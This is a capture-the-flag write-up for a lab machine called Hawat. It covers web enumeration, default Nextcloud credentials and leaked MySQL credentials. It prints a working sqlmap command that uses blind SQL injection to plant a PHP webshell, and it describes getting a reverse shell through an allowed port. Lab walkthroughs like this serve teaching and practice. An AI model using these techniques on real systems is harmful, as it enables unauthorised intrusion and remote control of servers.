# Hawat
### Enumeration
There are 3 webservers on ports 17445, 30445 and 50080.

##### 17445
An issue tracker with a login and register form. I registered a user and then was able to list other users and found `clinton` and `dummy`.

##### 30445
We see in the source code that there's a `title` GET parameter which is vulnerable to XSS. We find a file `phpinfo.php` after fuzzing the path. This tells us that PHP is running on this webserver and that the root directory is at `/srv/http`.

##### 50080
An uninteresting webpage. Do some directory fuzzing and find `/cloud` which goes to a Nextcloud login page. The credentials `admin:admin` get us in. We're able to download the code for the issue tracking application. We find MySQL credentials: `issue_user:ManagementInsideOld797`. We also find an endpoint (`/issue/checkByPriority`) that appears to have a blind SQL injection vulnerability. The code shows that it responds to GET requests, but I was getting a 405 (method not allowed) when trying GET, and POST returned results. I ran `sqlmap` to enumerate the database but nothing useful was found.

Instead, we upload a webshell to `/srv/http/shell.php` using `sqlmap` as below:

```shell-session
$ sqlmap --cookie 'JSESSIONID=DB237E6E030E9E373F349ABDE2912086' -u 192.168.54.147:17445/issue/checkByPriority --data 'priority=Normal' --batch --file-write=/usr/share/webshells/php/simple-backdoor.php --file-dest=/srv/http/shell.php
```

We can read the flag using this webshell, but we can also get a reverse shell using `/usr/share/webshells/php/php-reverse-shell.php`. I added some characters to the beginning, since the `sqlmap` file write operation seemed to be prepending some stuff to the uploaded files. I also set the local port to 50080, i.e. specifically one of the ports that was open on the target, in case of any firewall rules.